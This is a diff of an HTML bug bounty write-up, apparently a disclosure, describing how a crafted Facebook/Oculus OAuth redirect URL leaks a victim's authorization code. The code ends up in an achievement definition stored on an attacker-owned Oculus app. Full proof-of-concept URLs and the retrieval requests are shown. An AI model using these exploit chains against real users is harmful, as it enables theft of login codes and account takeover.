@@ -124,40 +124,28 @@ https://www.facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&amp;redirect_
 
 <p><strong>Third and final try</strong></p>
 
-<table>
-  <tbody>
-    <tr>
-      <td>The API endpoint <strong><em>https://graph.oculus.com/{OC_APP_ID}/achievement_definitions</em></strong>  could be used to create a new achievement definition for a certain owned oculus application. The endpoint accepts many parameters and some of them would be saved and could be fetched later by us. To make a request to this API endpoint, we could include our own application credentials in the final URL to be sent to the victim. We can use one of these parameter like the description field which should be filled with the victim code. The code can be retrieved later by first fetching ***https://graph.oculus.com/{OC_APP_ID}/achievement_definitions?method=get&amp;access_token=OC</td>
-      <td>ATTACKER_APP_ID</td>
-      <td>APP_SECRET***. This would return the list of achievements ids. Each id would be referring to different stored code. To retrieve the code:</td>
-    </tr>
-    <tr>
-      <td>***https://graph.oculus.com/{ACHIEVEMENT_ID}?fields=description&amp;method=get&amp;access_token=OC</td>
-      <td>ATTACKER_APP_ID</td>
-      <td>APP_SECRET***. We’ll find “-code=CODE_HERE” in the description field.</td>
-    </tr>
-  </tbody>
-</table>
+<p>The API endpoint <strong><em>https://graph.oculus.com/{OC_APP_ID}/achievement_definitions</em></strong>  could be used to create a new achievement definition for a certain owned oculus application. The endpoint accepts many parameters and some of them would be saved and could be fetched later by us. To make a request to this API endpoint, we could include our own application credentials in the final URL to be sent to the victim. We can use one of these parameter like the description field which should be filled with the victim code. The code can be retrieved later by first fetching <strong><em>https://graph.oculus.com/{OC_APP_ID}/achievement_definitions?method=get&amp;access_token=OC|ATTACKER_APP_ID|APP_SECRET</em></strong>. This would return the list of achievements ids. Each id would be referring to different stored code. To retrieve the code:<br />
+<strong><em>https://graph.oculus.com/{ACHIEVEMENT_ID}?fields=description&amp;method=get&amp;access_token=OC|ATTACKER_APP_ID|APP_SECRET</em></strong>. We’ll find “-code=CODE_HERE” in the description field.</p>
 
 <p><strong>Proof of concept</strong></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&amp;redirect_uri=https%3A%2F%2Fauth.oculus.com%2Flogin-without-facebook%2F%3Fajaxpipe%3D1%26redirect_uri%3Dhttps%253a%2F%2Fgraph.oculus.com%2FATTACKER_APP_ID%2Fachievement_definitions%253fmethod%253dpost%2526access_token%253d&lt;strong&gt;OC|ATTACKER_APP_ID|ATTACKER_APP_SECRET&lt;/strong&gt;%2526api_name%253dVISIT_3_CONTINENTS%2526achievement_type%253dBITFIELD%2526achievement_write_policy%253dCLIENT_AUTHORITATIVE%2526target%253d3%2526bitfield_length%253d7%2526is_archived%253dfalse%2526title%253dAchievement%2526unlocked_description_override%253dYou%252bdid%252bit%2526is_secret%253dfalse%2526description%253d-ajaxpipe&amp;response_type=code
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&amp;redirect_uri=https%3A%2F%2Fauth.oculus.com%2Flogin-without-facebook%2F%3Fajaxpipe%3D1%26redirect_uri%3Dhttps%253a%2F%2Fgraph.oculus.com%2FATTACKER_APP_ID%2Fachievement_definitions%253fmethod%253dpost%2526access_token%253dOC|ATTACKER_APP_ID|ATTACKER_APP_SECRET&lt;/strong&gt;%2526api_name%253dVISIT_3_CONTINENTS%2526achievement_type%253dBITFIELD%2526achievement_write_policy%253dCLIENT_AUTHORITATIVE%2526target%253d3%2526bitfield_length%253d7%2526is_archived%253dfalse%2526title%253dAchievement%2526unlocked_description_override%253dYou%252bdid%252bit%2526is_secret%253dfalse%2526description%253d-ajaxpipe&amp;response_type=code
 </code></pre></div></div>
 
 <p>Where <strong>OC|ATTACKER_APP_ID|ATTACKER_APP_SECRET</strong> is the attacker owned Oculus application credentials<br />
 This URL would redirect to:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://auth.oculus.com/login-without-facebook/?&lt;strong&gt;ajaxpipe=1&amp;&lt;/strong&gt;redirect_uri=https%3A%2F%2Fgraph.oculus.com%2FATTACKER_APP_ID%2Fachievement_definitions%3Fmethod%3Dpost%26access_token%3DOC%7CATTACKER_APP_ID%7CATTACKER_APP_SECRET%26api_name%3DVISIT_3_CONTINENTS%26achievement_type%3DBITFIELD%26achievement_write_policy%3DCLIENT_AUTHORITATIVE%26target%3D3%26bitfield_length%3D7%26is_archived%3Dfalse%26title%3DAchievement%26unlocked_description_override%3DYou%2Bdid%2Bit%26is_secret%3Dfalse%26description%3D-&lt;strong&gt;ajaxpipe&amp;&lt;/strong&gt;code=VICTIM_CODE
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://auth.oculus.com/login-without-facebook/?ajaxpipe=1&amp;&lt;/strong&gt;redirect_uri=https%3A%2F%2Fgraph.oculus.com%2FATTACKER_APP_ID%2Fachievement_definitions%3Fmethod%3Dpost%26access_token%3DOC%7CATTACKER_APP_ID%7CATTACKER_APP_SECRET%26api_name%3DVISIT_3_CONTINENTS%26achievement_type%3DBITFIELD%26achievement_write_policy%3DCLIENT_AUTHORITATIVE%26target%3D3%26bitfield_length%3D7%26is_archived%3Dfalse%26title%3DAchievement%26unlocked_description_override%3DYou%2Bdid%2Bit%26is_secret%3Dfalse%26description%3D-ajaxpipe&amp;&lt;/strong&gt;code=VICTIM_CODE
 </code></pre></div></div>
 
 <p>This would result to the second format response being returned and the regex trying to remove ajaxpipe words appearances. It should redirect to this URL:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://auth.oculus.com/login-without-facebook/?redirect_uri=&lt;strong&gt;https%3A%2F%2Fgraph.oculus.com%2FATTACKER_APP_ID%2Fachievement_definitions%3Fmethod%3Dpost%26access_token%3DOC%7CATTACKER_APP_ID%7CATTACKER_APP_SECRET%26api_name%3DVISIT_3_CONTINENTS%26achievement_type%3DBITFIELD%26achievement_write_policy%3DCLIENT_AUTHORITATIVE%26target%3D3%26bitfield_length%3D7%26is_archived%3Dfalse%26title%3DAchievement%26unlocked_description_override%3DYou%2Bdid%2Bit%26is_secret%3Dfalse%26description%3D-code=VICTIM_CODE&lt;/strong&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://auth.oculus.com/login-without-facebook/?redirect_uri=https%3A%2F%2Fgraph.oculus.com%2FATTACKER_APP_ID%2Fachievement_definitions%3Fmethod%3Dpost%26access_token%3DOC%7CATTACKER_APP_ID%7CATTACKER_APP_SECRET%26api_name%3DVISIT_3_CONTINENTS%26achievement_type%3DBITFIELD%26achievement_write_policy%3DCLIENT_AUTHORITATIVE%26target%3D3%26bitfield_length%3D7%26is_archived%3Dfalse%26title%3DAchievement%26unlocked_description_override%3DYou%2Bdid%2Bit%26is_secret%3Dfalse%26description%3D-code=VICTIM_CODE&lt;/strong&gt;
 </code></pre></div></div>
 
 <p>The code parameter was appended to the redirect_uri. Since graph.oculus.com is a whitelisted domain, the endpoint /login-without-facebook/ would redirect to the URL inside redirect_uri:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.oculus.com/ATTACKER_APP_ID/achievement_definitions?method=post&amp;access_token=&lt;strong&gt;OC|ATTACKER_APP_ID|ATTACKER_APP_SECRET&lt;/strong&gt;&amp;api_name=VISIT_3_CONTINENTS&amp;achievement_type=BITFIELD&amp;achievement_write_policy=CLIENT_AUTHORITATIVE&amp;target=3&amp;bitfield_length=7&amp;is_archived=false&amp;title=Achievement&amp;unlocked_description_override=You+did+it&amp;is_secret=false&amp;&lt;strong&gt;description=-code=VICTIM_CODE&lt;/strong&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.oculus.com/ATTACKER_APP_ID/achievement_definitions?method=post&amp;access_token=OC|ATTACKER_APP_ID|ATTACKER_APP_SECRET&lt;/strong&gt;&amp;api_name=VISIT_3_CONTINENTS&amp;achievement_type=BITFIELD&amp;achievement_write_policy=CLIENT_AUTHORITATIVE&amp;target=3&amp;bitfield_length=7&amp;is_archived=false&amp;title=Achievement&amp;unlocked_description_override=You+did+it&amp;is_secret=false&amp;description=-code=VICTIM_CODE&lt;/strong&gt;
 </code></pre></div></div>
 
 <p>Since the access_token is valid, a new achievement definition should be created with the field description having the value <strong>-code=VICTIM_CODE</strong>.</p>
